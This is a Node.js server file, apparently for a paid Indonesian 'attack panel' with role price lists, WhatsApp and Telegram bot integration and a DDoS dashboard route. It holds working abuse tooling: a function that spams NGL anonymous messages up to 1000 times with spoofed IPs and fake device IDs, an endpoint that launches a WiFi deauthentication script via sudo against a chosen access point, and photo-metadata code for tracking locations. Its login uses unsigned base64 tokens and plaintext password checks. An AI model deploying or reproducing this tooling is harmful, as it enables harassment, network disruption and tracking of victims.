const { Token, owner, ptla, ptlc, domain } = require("./config");
const plta = ptla;
const pltc = ptlc;
const express = require("express");
const AdmZip = require('adm-zip');
const fs = require("fs");
const chalk = require('chalk');
const path = require("path");
const cookieParser = require('cookie-parser');
const cors = require('cors');
const tar = require("tar");
const os = require("os");
const fse = require('fs-extra');
const bodyParser = require("body-parser");
const { spawn } = require('child_process');
const ACC_PATH = path.join(__dirname, 'acc.json');
// ==== COOLDOWN SETTINGS ====
const lastAttackByUser = new Map(); // simpan last attack tiap username
// ===========================
const axios = require('axios');
const crypto = require('crypto');
let maintenanceMode = false;
const {
    default: makeWASocket,
    makeInMemoryStore,
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket: WASocket,
    getGroupInviteInfo,
    AuthenticationState,
    BufferJSON,
    proto,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessage,
    generateMessageID,
    generateWAMessageContent,
    encodeSignedDeviceIdentity,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    getContentType,
    mentionedJid,
    relayWAMessage,
    templateMessage,
    InteractiveMessage,
    Header,
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageContent,
    WAMessage,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMediaUpload,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    Presence,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    areJidsSameUser,
    ChatModification,
    getStream,
    isBaileys,
    jidDecode,
    processTime,
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    isJidUser,
    DisconnectReason,
    MediaConnInfo,
    ReconnectMode,
    AnyMessageContent,
    waChatKey,
    WAProto,
    BaileysError
} = require('@whiskeysockets/baileys');
const pino = require("pino");
const { Telegraf, Markup } = require("telegraf");

const app = express();
const PORT = process.env.PORT || 5000;

app.use(express.json());
app.use((req, res, next) => {
  if (maintenanceMode && !req.path.startsWith('/maintenance')) {
    return res.sendFile(path.join(__dirname, 'public', 'maintenance.html'));
  }
  next();
});
app.use(express.static('public'));
app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ limit: '20mb', extended: true }));
app.use(cookieParser());
app.use(cors());

const file_session = "./sessions.json";
const sessions_dir = "./sessions";
const sessions = new Map();
const serverFilePath = path.join(__dirname, "server.js");
const pendingEdit = new Map();
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const bot = new Telegraf(Token);
const RESOWN_FILE = './resown.json'; // File untuk owner dan reseller
// === Online users tracker (heartbeat) ===
const ONLINE_TTL_MS = 60_000; // dianggap "online" jika ping < 60 detik terakhir
const onlineUsers = new Map(); // key: username, value: lastSeen timestamp
const multer = require('multer');
const exifr = require('exifr');
const sharp = require('sharp');
const extractChunks = require('png-chunks-extract');
const { XMLParser } = require('fast-xml-parser');
const ExifReader = require('exifreader');
const storage = multer.memoryStorage();
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 20 * 1024 * 1024 } // 20 MB
});
const bcrypt = require('bcrypt');
const rateLimit = require('express-rate-limit');
const ACC_FILE = path.join(__dirname, 'acc.json');
const BCRYPT_ROUNDS = 12;
const GROUP_ID = -1002710223649; // ID grup tujuan
// ====== CONFIG PRICELIST (bebas ganti link & teks) ======
const ORDER_URL   = "https://t.me/vinzznyabobo";            // link order
const CHANNEL_URL = "https://t.me/spcinformation";  // link channel/announcement

const PRICE_TEXT_HTML = `
💸 <b>Daftar Harga Produk</b>

1. Role Member /bulan   → <b>Rp40.000</b>
2. Role Member Permanen → <b>Rp65.000</b>
3. Role Reseller Permanen → <b>Rp80.000</b>
4. Role Owner Permanen    → <b>Rp100.000</b>
4. Role High Admin Permanen →<b>Rp150.000</b>
<b>👨‍💻ALL STAFF/ADMIN/OWN/RESS WAJIB MENGIKUTI HARGA DIATAS!!</b>
`.trim();
const configPath = path.resolve(__dirname, "config.js");
const config = require("./config.js");

function updateConfig(newData) {
  Object.assign(config, newData);
  const exportText = "module.exports = " + JSON.stringify(config, null, 2) + ";\n";
  fs.writeFileSync(configPath, exportText, "utf8");
  console.log("[CONFIG] Updated:", newData);
}

function buildUrl(pathUrl) {
  return `${config.domain.replace(/\/+$/, "")}${pathUrl}`;
}

// pastikan acc.json ada
if (!fs.existsSync(ACC_FILE)) fs.writeFileSync(ACC_FILE, '[]', 'utf8');

// Rate limit: 10 percobaan/15 menit per IP
const changePasswordLimiter = rateLimit({
  windowMs: 15*60*1000,
  max: 10,
  message: { ok:false, error: 'Terlalu banyak percobaan. Coba lagi nanti.' },
  standardHeaders: true,
  legacyHeaders: false,
});

// === FUNGSI UNTUK AMBIL DATA SERVER ===
function getServerStatus() {
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  
  const memoryUsage = process.memoryUsage().heapUsed / 1024 / 1024;
  const cpuUsage = os.loadavg()[0].toFixed(2);
  const ping = Math.floor(Math.random() * 10) + 1; // simulasi ping 1–10ms
  
  const timeNow = new Date().toLocaleTimeString('id-ID', { hour12: true });
  
  return {
    time: timeNow,
    ping,
    ram: memoryUsage.toFixed(2),
    cpu: cpuUsage,
    uptime: `${hours}h ${minutes}m ${seconds}s`,
    db: totalEntries,
  };
}

// Cek kekuatan password
function isStrongPassword(pw) {
  return typeof pw === 'string'
    && pw.length >= 8
    && /[a-z]/.test(pw)
    && /[A-Z]/.test(pw)
    && /[0-9]/.test(pw);
}

/**
 * Helper: bandingkan input password dengan field yang mungkin plaintext ATAU bcrypt.
 */
async function compareMixed(input, stored) {
  if (!stored) return false;
  // Jika sudah hash bcrypt
  if (typeof stored === 'string' && stored.startsWith('$2')) {
    try { return await bcrypt.compare(input, stored); }
    catch { return false; }
  }
  // fallback plaintext (format lama)
  return input === stored;
}

// ===================== BOT - LUPA PASSWORD & LIHAT PASSWORD =====================
// ===================== PRIVATE-ONLY + OWNER-AWARE COMMANDS =====================

// Helper: ambil daftar owner (pakai yang sudah ada di project-mu)
function getOwnersFromConfig() {
  try {
    if (typeof loadResown === 'function') {
      const conf = loadResown();
      if (conf && Array.isArray(conf.owners)) return conf.owners.map(String);
    }
  } catch (e) { /* ignore */ }
  // fallback ke env kalau perlu: BOT_OWNERS=123,456
  const envOwners = (process.env.BOT_OWNERS || '').split(',').map(s => s.trim()).filter(Boolean);
  return envOwners;
}

// Helper: harus private chat
function ensurePrivate(ctx) {
  if (ctx.chat?.type !== 'private') {
    ctx.reply('❌ Command ini hanya bisa digunakan di *private chat*.', { parse_mode: 'Markdown' });
    return false;
  }
  return true;
}

// Helper: mask string (untuk balasan generik)
function mask(str = '', keepStart = 2, keepEnd = 2) {
  const s = String(str);
  if (s.length <= keepStart + keepEnd) return '*'.repeat(Math.max(0, s.length));
  return s.slice(0, keepStart) + '*'.repeat(s.length - keepStart - keepEnd) + s.slice(-keepEnd);
}

// Helper: kirim notif ke semua owner
async function notifyOwnersForgotPW({ username, from, deviceId, ip, ua }) {
  const owners = getOwnersFromConfig();
  if (!owners.length) return;

  const text =
`🆘 *Lupa Password Request*
👤 Username: \`${username}\`
📱 Device-ID: \`${deviceId || '-'}\`
🌐 IP: \`${ip || '-'}\`
🧭 UA: \`${ua || '-'}\`
💬 Kontak: ${from || '-'}

*Catatan:* Verifikasi pemilik akun sebelum reset.
Jika setuju reset, ubah password (bcrypt) dan set *lastForceLogoutAt* agar semua sesi lama logout.`;

  for (const id of owners) {
    try { await bot.telegram.sendMessage(id, text, { parse_mode: 'Markdown' }); }
    catch (e) { console.error('Notify owner fail:', e?.message || e); }
  }
}

// ===== Rate limit sederhana utk /lupapass (per Telegram ID) =====
const lastForgotReq = new Map(); // id -> { ts, cnt }
const FORGOT_WINDOW_MS = 15 * 60 * 1000; // 15 menit
const FORGOT_MAX = 5;

// FUNGSI LACAK LOK VIA FOTO
function guessDateFromName(name='') {
  // contoh cocokkan IMG_20230910_123456 atau 2023-09-10
  const m1 = name.match(/(20\d{2})(\d{2})(\d{2})[_-]?(\d{2})(\d{2})(\d{2})?/);
  if (m1) {
    const [_, y, mo, d, h='00', mi='00', s='00'] = m1;
    return `${y}-${mo}-${d}T${h}:${mi}:${s}Z`;
  }
  const m2 = name.match(/(20\d{2})[-_\.](\d{2})[-_\.](\d{2})/);
  if (m2) return `${m2[1]}-${m2[2]}-${m2[3]}T00:00:00Z`;
  return null;
}

async function parsePngXmp(buf) {
  try {
    const chunks = extractChunks(buf);
    const xmpChunk = chunks.find(c =>
      (c.name === 'iTXt' || c.name === 'tEXt') &&
      (String(c.data).includes('xmp') || String(c.data).includes('XML:com.adobe.xmp'))
    );
    if (!xmpChunk) return null;
    // ambil bagian XML saja
    const raw = String(xmpChunk.data);
    const xmlStart = raw.indexOf('<x:xmpmeta');
    const xmlEnd = raw.lastIndexOf('</x:xmpmeta>');
    if (xmlStart === -1 || xmlEnd === -1) return null;
    const xml = raw.slice(xmlStart, xmlEnd + '</x:xmpmeta>'.length);
    const parser = new XMLParser({ ignoreAttributes: false, attributeNamePrefix: '' });
    return parser.parse(xml);
  } catch { return null; }
}

async function buildMeta(buffer, originalname) {
  // dimensi + thumbnail
  let imageSize = {}, thumbB64 = null, format = '';
  try {
    const meta = await sharp(buffer).metadata();
    imageSize = { width: meta.width, height: meta.height };
    format = (meta.format || '').toLowerCase();
    const tn = await sharp(buffer).resize(400, 400, { fit: 'inside' }).jpeg({ quality: 75 }).toBuffer();
    thumbB64 = tn.toString('base64');
  } catch {}

  // EXIF/XMP via exifr (jpeg/heic/webp/tiff)
  let tags = null;
  try {
    tags = await exifr.parse(buffer, { xmp: true, tiff: true, reviveValues: true });
  } catch {}

  // PNG: coba baca XMP dari chunk
  let xmp = null;
  if ((!tags || Object.keys(tags).length === 0) && format === 'png') {
    xmp = await parsePngXmp(buffer);
  }

  // gabung jadi struktur yang kita pakai di frontend
  const exif = {
    dateTaken:
      tags?.DateTimeOriginal?.toISOString?.() ||
      tags?.CreateDate?.toISOString?.() ||
      tags?.ModifyDate?.toISOString?.() ||
      xmp?.['x:xmpmeta']?.rdf?.Description?.['exif:DateTimeOriginal'] ||
      xmp?.['x:xmpmeta']?.rdf?.Description?.['xmp:CreateDate'] ||
      guessDateFromName(originalname),
    camera: {
      make: tags?.Make || xmp?.['x:xmpmeta']?.rdf?.Description?.['tiff:Make'] || null,
      model: tags?.Model || xmp?.['x:xmpmeta']?.rdf?.Description?.['tiff:Model'] || null,
      software: tags?.Software || xmp?.['x:xmpmeta']?.rdf?.Description?.['xmp:CreatorTool'] || null,
    },
    exposure: {
      exposureTime: tags?.ExposureTime || null,
      fNumber: tags?.FNumber || null,
      iso: tags?.ISO || null,
      focalLength: tags?.FocalLength || null,
      focalLengthIn35mm: tags?.FocalLengthIn35mm || null,
    },
    flash: { flashUsed: typeof tags?.Flash === 'boolean' ? tags.Flash : null },
    orientation: tags?.Orientation || null,
    imageSize,
    raw: tags || xmp || null,
    thumbnailBase64: thumbB64
  };

  // GPS
  let lat = null, lon = null;
  if (tags?.latitude && tags?.longitude) {
    lat = Number(tags.latitude); lon = Number(tags.longitude);
  } else if (xmp) {
    const d = xmp['x:xmpmeta']?.rdf?.Description || {};
    // beberapa namespace XMP
    lat = Number(d['exif:GPSLatitude'] || d['GPano:GPSLatitude'] || d['gs2:Latitude'] || NaN);
    lon = Number(d['exif:GPSLongitude'] || d['GPano:GPSLongitude'] || d['gs2:Longitude'] || NaN);
    if (Number.isNaN(lat)) lat = null;
    if (Number.isNaN(lon)) lon = null;
  }

  return { exif, gps: (lat != null && lon != null) ? { lat, lon } : null };
}
//fungsi penghitung user onlen
function pruneOnlineUsers() {
  const now = Date.now();
  for (const [u, t] of onlineUsers.entries()) {
    if (now - t > ONLINE_TTL_MS) onlineUsers.delete(u);
  }
}
setInterval(pruneOnlineUsers, 15_000);

// Hitung sender aktif dari sesi WA yang kamu pakai sekarang
function countActiveSenders() {
  // prioritas 1: Map sessions (real-time koneksi yang terbuka)
  let fromMap = 0;
  try { fromMap = sessions.size; } catch (e) {}

  // prioritas 2: file_session (daftar nomor yang pernah diaktifkan)
  let fromFile = 0;
  try {
    if (fs.existsSync(file_session)) {
      const arr = JSON.parse(fs.readFileSync(file_session, 'utf8'));
      fromFile = Array.isArray(arr) ? arr.length : 0;
    }
  } catch (e) {}

  // prioritas 3: cek folder sessions/ yang punya creds.json
  let fromFolders = 0;
  try {
    if (fs.existsSync(sessions_dir)) {
      const subs = fs.readdirSync(sessions_dir, { withFileTypes: true })
        .filter(d => d.isDirectory())
        .map(d => path.join(sessions_dir, d.name));
      fromFolders = subs.filter(dir => fs.existsSync(path.join(dir, 'creds.json'))).length;
    }
  } catch (e) {}

  // ambil angka terbesar biar aman
  return Math.max(fromMap, fromFile, fromFolders);
}
// --- Fungsi Helper untuk resown.json ---
const loadResown = () => {
    try {
        if (!fs.existsSync(RESOWN_FILE)) {
            // Inisialisasi dengan owner utama jika file belum ada
            fs.writeFileSync(RESOWN_FILE, JSON.stringify({ owners: [owner], resellers: [] }, null, 2));
        }
        return JSON.parse(fs.readFileSync(RESOWN_FILE, 'utf8'));
    } catch (error) {
        console.error('Error loading resown.json:', error);
        return { owners: [owner], resellers: [] }; // Default jika ada error
    }
};

const saveResown = (data) => {
    try {
        fs.writeFileSync(RESOWN_FILE, JSON.stringify(data, null, 2));
    } catch (error) {
        console.error('Error saving resown.json:', error);
    }
};

// Pastikan owner utama ada di resown.json saat startup
let resownData = loadResown();
if (!resownData.owners.includes(owner)) {
    resownData.owners.push(owner);
    saveResown(resownData);
}

// Load accounts from acc.json
const loadAccounts = () => {
  try {
    const data = fs.readFileSync('./acc.json', 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error loading accounts:', error);
    return [];
  }
};

const saveAccounts = (accounts) => {
  try {
    fs.writeFileSync('./acc.json', JSON.stringify(accounts, null, 2));
  } catch (error) {
    console.error('Error saving accounts:', error);
  }
};
const totalEntries = loadAccounts().length;
// ngl function
async function generateRandomIp() {
    let ip = [];
    for (let i = 0; i < 4; i++) {
      ip.push(Math.floor(Math.random() * 255));
    }
    return ip.join('.');
}

/**
 * Menghasilkan Device ID acak.
 */
async function generateRandomDeviceId() {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = 16; // Panjang yang umum digunakan
    let deviceId = '';
    for (let i = 0; i < length; i++) {
      const randomIndex = Math.floor(Math.random() * characters.length);
      deviceId += characters.charAt(randomIndex);
    }
    return deviceId;
}

/**
 * Mengirim pesan NGL menggunakan axios dengan IP & Device ID acak.
 * @param {string} username - Username NGL target.
 * @param {string} message - Isi pesan.
 * @param {number} times - Jumlah pengiriman.
 */
async function sendNGL(username, message, times = 1) {
    if (!username || !message) throw new Error('Username & pesan wajib diisi');
    if (!/^[a-z0-9_.-]+$/i.test(username)) throw new Error('Format username NGL tidak valid');

    const url = 'https://ngl.link/api/submit';
    const loopCount = Math.min(Math.max(Number(times) || 1, 1), 1000); // Batas tetap 1000
    let sentCount = 0;

    for (let i = 0; i < loopCount; i++) {
        try {
            const randomIp = await generateRandomIp();
            const randomDeviceId = await generateRandomDeviceId();

            const headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-forwarded-for': randomIp,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
            };

            const data = new URLSearchParams({
                username: username,
                question: message,
                deviceId: randomDeviceId
            }).toString();

            const response = await axios.post(url, data, { headers });

            if (response.status === 200) {
                sentCount++;
            } else if (response.status === 404) {
                throw new Error('User tidak ditemukan.');
            } else {
                // Berhenti jika mendapat status error lain
                throw new Error(`NGL merespons dengan status ${response.status}`);
            }

            // Jeda singkat antar pengiriman
            await new Promise(r => setTimeout(r, 300));

        } catch (error) {
            let errorMessage = 'Gagal mengirim pesan.';
            if (error.response && error.response.status === 404) {
                errorMessage = 'User tidak ditemukan.';
            } else if (error.message) {
                errorMessage = error.message;
            }
            // Jika ada error, hentikan loop dan lempar pesan error
            throw new Error(`${errorMessage} (Terkirim: ${sentCount})`);
        }
    }
    return sentCount;
}
// ===== Cooldown Config =====

function getUserIndex(accounts, username) {
  return accounts.findIndex(a => (a.username || '').toLowerCase() === (username || '').toLowerCase());
}
// ====== Cooldown Middleware ======
function enforceCooldown(req, res, next) {
  const accounts = loadAccounts();
  const userFromToken = req.user;

  if (!userFromToken?.username) {
    return res.status(401).json({ status: false, message: 'Invalid token user' });
  }

  const role = (userFromToken.role || 'USER').toUpperCase();
  if (role === 'DEV') return next(); // admin bebas cooldown

  const idx = accounts.findIndex(a => a.username === userFromToken.username);
  if (idx === -1) {
    return res.status(403).json({ status: false, message: 'User tidak ditemukan di akun list' });
  }

  const userFromFile = accounts[idx];
  const now = Date.now();
  const lastLaunch = userFromFile.lastLaunch || 0;
  const elapsed = now - lastLaunch;

  const COOLDOWN_SECONDS = 20;
  const COOLDOWN_MS = COOLDOWN_SECONDS * 1000;

  // 🚫 Jika masih cooldown
  if (elapsed < COOLDOWN_MS) {
    const remaining = Math.ceil((COOLDOWN_MS - elapsed) / 1000);
    return res.status(429).json({
      status: false,
      message: `⏳ Tunggu ${remaining} detik lagi sebelum bisa menyerang lagi.`
    });
  }

  // ✅ Jika lewat cooldown, update waktu terakhir otomatis
  accounts[idx].lastLaunch = now;
  saveAccounts(accounts);

  next(); // lanjut ke handler utama
}

// AFTER: token ikut bawa deviceId & role di-normalize
// gunakan const atau function, yang penting payload bawa deviceId
const generateToken = (user) => {
  const payload = {
    username: user.username,
    role: (user.role || 'USER').toUpperCase(),
    deviceId: user.deviceId || null,
    timestamp: Date.now()
  };
  return Buffer.from(JSON.stringify(payload)).toString('base64'); // (boleh tetap pakai base64 kamu)
};

// Verify token
const verifyToken = (token) => {
  try {
    return JSON.parse(Buffer.from(token, 'base64').toString('utf8'));
  } catch (e) {
    return null;
  }
};

// Authentication middleware
// Middleware Auth: token base64 + binding device + force logout (440)
function requireAuth(req, res, next) {
  try {
    // 1) Ambil token dari Authorization
    const auth = req.headers.authorization || '';
    const token = auth.startsWith('Bearer ') ? auth.slice(7) : auth;
    if (!token) {
      return res.status(401).json({ success: false, message: 'Unauthorized' });
    }

    // 2) Verifikasi token base64 → payload { username, role, deviceId?, timestamp }
    const payload = verifyToken(token);
    if (!payload || !payload.username) {
      return res.status(401).json({ success: false, message: 'Invalid token' });
    }

    // 3) Header device dari klien (WAJIB)
    const clientDeviceId = req.headers['x-device-id'];
    if (!clientDeviceId) {
      return res.status(400).json({ success: false, message: 'Missing X-Device-Id header' });
    }

    // 4) Ambil user dari acc.json
    const accounts = loadAccounts();
    const user = accounts.find(a => (a.username || '').toLowerCase() === payload.username.toLowerCase());
    if (!user) {
      return res.status(401).json({ success: false, message: 'User not found' });
    }

    // 5) Cek sesi paksa logout (invalidate token lama)
    const tokenIssuedAt = Number(payload.timestamp || 0);
    const userLastForce = Number(user.lastForceLogoutAt || 0);
    if (userLastForce && tokenIssuedAt < userLastForce) {
      return res.status(440).json({
        success: false,
        message: 'Session expired (force logout). Silakan login lagi.'
      });
    }

    // 6) Binding device: kalau belum terikat
    if (!user.deviceId) {
      // Frontend kamu handle status 423 → tampilkan "Device belum terikat. Silakan login ulang."
      return res.status(423).json({
        success: false,
        message: 'Device belum terikat. Silakan login ulang.'
      });
    }

    // 7) Tolak jika device berbeda
    if (user.deviceId !== clientDeviceId) {
      // Frontend kamu handle status 403 → tampilkan "Akun ini terikat ke device lain."
      return res.status(403).json({
        success: false,
        message: 'Akun ini terikat ke device lain.'
      });
    }

    // 8) (Opsional) Cocokkan deviceId yg dibawa token (kalau ada)
    if (payload.deviceId && payload.deviceId !== clientDeviceId) {
      return res.status(403).json({
        success: false,
        message: 'Token device mismatch.'
      });
    }

    // 9) Pasang user ke req, normalisasi role
    req.user = {
      username: user.username,
      role: (user.role || 'USER').toUpperCase(),
      deviceId: clientDeviceId
    };

    return next();
  } catch (err) {
    return res.status(401).json({ success: false, message: 'Invalid token' });
  }
}
//function info user di kotak
function authFromToken(req, res, next) {
  try {
    const auth = req.headers.authorization || '';
    const token = auth.replace(/^Bearer\s+/i, '');
    if (!token) return res.status(401).json({ success:false, message:'No token' });
    const payload = JSON.parse(Buffer.from(token, 'base64').toString('utf8')); // {username, role, deviceId?}
    req.user = payload;
    next();
  } catch (e) {
    return res.status(401).json({ success:false, message:'Invalid token' });
  }
}

// pengikat 1 user 1 device
const loginHandler = (req, res) => {
  const { username, password, deviceId, force } = req.body;
  if (!deviceId) {
    return res.status(400).json({ success: false, message: 'deviceId is required' });
  }

  const accounts = loadAccounts();
  const user = accounts.find(acc => acc.username === username && acc.password === password);

  if (!user) {
    return res.status(401).json({ success: false, message: 'Invalid credentials' });
  }

  if (!user.deviceId) {
    user.deviceId = deviceId;                 // bind pertama kali
    saveAccounts(accounts);
  } else if (user.deviceId !== deviceId) {
    if (!force) {
      return res.status(403).json({
        success: false,
        message: 'Account already bound to another device.'
      });
    }
    // NOTE: idealnya verifikasi ekstra (OTP/email). Untuk simple:
    user.deviceId = deviceId;                 // pindahkan binding
    saveAccounts(accounts);
  }

  const role = (user.role || 'USER').toUpperCase();
  const token = generateToken({ ...user, role });

  return res.json({
    success: true,
    token,
    user: {
      username: user.username,
      role,
      expired: user.expired,
      deviceId: user.deviceId
    }
  });
};

// Web routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/ddos-dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'ddos-dashboard.html'));
});

// Helper function to check if account is expired
const isAccountExpired = (expired) => {
  if (!expired) return false;

  const now = new Date();
  const expiryDate = parseExpiryDate(expired);

  return now > expiryDate;
};

// Helper function to parse expiry date (1d, 1h, etc.)
const parseExpiryDate = (expired) => {
  if (!expired) return new Date(Date.now() + 365 * 24 * 60 * 60 * 1000); // 1 year default

  const regex = /^(\d+)([dhmy])$/i;
  const match = expired.match(regex);

  if (!match) return new Date(expired); // Try parsing as regular date

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();
  const now = new Date();

  switch (unit) {
    case 'd': return new Date(now.getTime() + value * 24 * 60 * 60 * 1000);
    case 'h': return new Date(now.getTime() + value * 60 * 60 * 1000);
    case 'm': return new Date(now.getTime() + value * 30 * 24 * 60 * 60 * 1000); // 1 bulan = 30 hari
    case 'y': return new Date(now.getTime() + value * 365 * 24 * 60 * 60 * 1000);
    default: return new Date(now.getTime() + 24 * 60 * 60 * 1000); // 1 day default
  }
};

// Function to clean expired accounts
const cleanExpiredAccounts = () => {
  const accounts = loadAccounts();
  const validAccounts = accounts.filter(acc => !isAccountExpired(acc.expired));

  if (validAccounts.length !== accounts.length) {
    fs.writeFileSync('./acc.json', JSON.stringify(validAccounts, null, 2));
    console.log(`Removed ${accounts.length - validAccounts.length} expired accounts`);
  }
};

// Clean expired accounts on startup and every hour
cleanExpiredAccounts();
setInterval(cleanExpiredAccounts, 60 * 60 * 1000);

function toValidJid(target, type = 'user') {
  if (!target) return null;
  let digits = String(target).replace(/\D/g, '');
  if (!digits) return null;

  if (type === 'group') {
    // pastikan suffix grup
    return digits.endsWith('@g.us') ? digits : `${digits}@g.us`;
  }

  // default user
  return digits.endsWith('@s.whatsapp.net')
    ? digits
    : `${digits}@s.whatsapp.net`;
}
// ====== ROUTE API: POST /api/ngl/send ======
/**
 * Body JSON:
 * { "username": "ryuichi", "text": "halo dari dashboard", "times": 5 }
 */
app.post('/api/ngl/send', requireAuth, async (req, res) => {
  try {
    // Sesuaikan nama field dari 'text' (HTML) ke 'message' (fungsi baru)
    const { username, text: message, times } = req.body || {};
    
    const sentCount = await sendNGL(
        String(username || '').trim(), 
        String(message || '').trim(), 
        Number(times || 1)
    );

    res.json({ ok: true, sent: sentCount });

  } catch (e) {
    console.error('NGL error:', e);
    res.status(400).json({ ok: false, error: String(e.message || e) });
  }
});
//ENDPOINT WIFI JAMMER
app.post('/api/attack/wifi-deauth', requireAuth, (req, res) => {
    // Ambil parameter dari body request frontend
    const { interface, target_ap, channel, packets, skip_mac } = req.body;

    // 1. Validasi Input (SANGAT PENTING untuk keamanan)
    // Pastikan input tidak mengandung karakter berbahaya yang bisa menyebabkan command injection.
    // Contoh validasi sederhana:
    if (!interface || !/^[a-zA-Z0-9]+$/.test(interface)) {
        return res.status(400).json({ success: false, message: "Invalid interface name." });
    }
    if (!target_ap || !/^[0-9a-fA-F:]+$/.test(target_ap)) {
        return res.status(400).json({ success: false, message: "Invalid target MAC address format." });
    }

    // 2. Siapkan argumen untuk skrip Python
    // Simpan skrip python Anda dengan nama misal: wifi_deauth.py
    const scriptPath = path.join(__dirname, 'wifi_deauth.py'); 
    
    let args = [
        scriptPath,
        '-i', interface,
        '-a', target_ap
    ];

    if (channel) args.push('-c', channel);
    if (packets) args.push('-p', packets);
    if (skip_mac) args.push('-s', skip_mac);
    
    // 3. Jalankan skrip Python dengan 'sudo'
    // PERINGATAN: Menjalankan 'sudo' dari aplikasi web sangat berisiko.
    // Pastikan Anda telah mengkonfigurasi sudoers agar tidak meminta password untuk perintah ini.
    console.log(`Executing: sudo python3 ${args.join(' ')}`);
    const pythonProcess = spawn('sudo', ['python3', ...args]);

    let output = '';
    let errorOutput = '';

    // 4. Tangkap output dari skrip
    pythonProcess.stdout.on('data', (data) => {
        console.log(`[Python STDOUT]: ${data}`);
        output += data.toString();
    });

    // 5. Tangkap error dari skrip
    pythonProcess.stderr.on('data', (data) => {
        console.error(`[Python STDERR]: ${data}`);
        errorOutput += data.toString();
    });

    // 6. Handle saat proses selesai
    pythonProcess.on('close', (code) => {
        console.log(`Python process exited with code ${code}`);
        if (code !== 0) {
            // Jika ada error, Anda bisa mengirimkannya kembali ke frontend
            // Jangan kirim response di sini jika sudah mengirim di awal
        }
    });

    // 7. Kirim response ke frontend segera agar tidak timeout
    res.json({ 
        success: true, 
        message: 'Deauthentication process started.',
        command: `sudo python3 ${args.join(' ')}` 
    });
});
// User: force logout semua device lain (invalidate semua token lama)
app.post('/api/user/force-logout-others', requireAuth, (req, res) => {
  const me = (req.user?.username || '').toString();
  const accounts = loadAccounts();
  const idx = accounts.findIndex(a => (a.username||'').toLowerCase() === me.toLowerCase());
  if (idx === -1) return res.status(404).json({ success:false, message:'User not found' });

  accounts[idx].lastForceLogoutAt = Date.now();
  saveAccounts(accounts);
  return res.json({ success:true, message:'Semua sesi lama telah dipaksa logout.' });
});
// Admin-only: paksa logout user tertentu
app.post('/api/admin/force-logout', requireAuth, (req, res) => {
  if ((req.user?.role || '').toUpperCase() !== 'ADMIN') {
    return res.status(403).json({ success:false, message:'Forbidden' });
  }
  const username = String(req.body?.username || '').trim();
  if (!username) return res.status(400).json({ success:false, message:'username is required' });

  const accounts = loadAccounts();
  const idx = accounts.findIndex(a => (a.username||'').toLowerCase() === username.toLowerCase());
  if (idx === -1) return res.status(404).json({ success:false, message:'User not found' });

  accounts[idx].lastForceLogoutAt = Date.now();
  saveAccounts(accounts);
  return res.json({ success:true, message:`Force-logout pushed for ${username}` });
});
/**
 * POST /api/user/change-password
 * body: { currentPassword, newPassword }
 * auth: requireAuth → req.user { username / id }
 */
app.post('/api/user/change-password', changePasswordLimiter, requireAuth, async (req, res) => {
  try {
    const body = req.body || {};
    const currentPassword = String(body.currentPassword || '');
    const newPassword = String(body.newPassword || '');

    if (!currentPassword || !newPassword) {
      return res.status(400).json({ ok:false, error:'Semua field wajib diisi.' });
    }
    if (!isStrongPassword(newPassword)) {
      return res.status(400).json({
        ok:false,
        error:'Password baru min 8 karakter, mengandung huruf besar, huruf kecil, dan angka.'
      });
    }

    const username = (req.user?.username || req.user?.id || '').toString();
    if (!username) return res.status(401).json({ ok:false, error:'Unauthorized' });

    // Ambil semua akun
    const acc = loadAccounts();
    const idx = acc.findIndex(u => (u.username||'').toLowerCase() === username.toLowerCase());
    if (idx === -1) {
      return res.status(403).json({ ok:false, error:'Akun tidak ditemukan.' });
    }

    const user = acc[idx];

    // verifikasi password lama
    const valid = await compareMixed(currentPassword, user.password);
    if (!valid) {
      return res.status(403).json({ ok:false, error:'Password saat ini salah.' });
    }

    // cek reuse
    const same = await compareMixed(newPassword, user.password);
    if (same) {
      return res.status(400).json({ ok:false, error:'Password baru harus berbeda dari yang lama.' });
    }

    // hash baru
    const newHash = await bcrypt.hash(newPassword, BCRYPT_ROUNDS);
    acc[idx].password = newHash;
    acc[idx].pwdChangedAt = new Date().toISOString();
    acc[idx].lastForceLogoutAt = Date.now(); // agar semua sesi lama expired

    saveAccounts(acc);

    return res.json({ ok:true, message:'Password berhasil diubah. Silakan login ulang.' });
  } catch (e) {
    console.error('change-password error:', e);
    return res.status(500).json({ ok:false, error:'Server error.' });
  }
});
// === NIK PARSER (background job) ===
// In-memory store untuk task (taskId -> { status, created, updated, data?, error? })
const nikTasks = new Map();

// cleanup periodik (hapus task > 48 jam)
setInterval(() => {
  const now = Date.now();
  for (const [id, t] of nikTasks.entries()) {
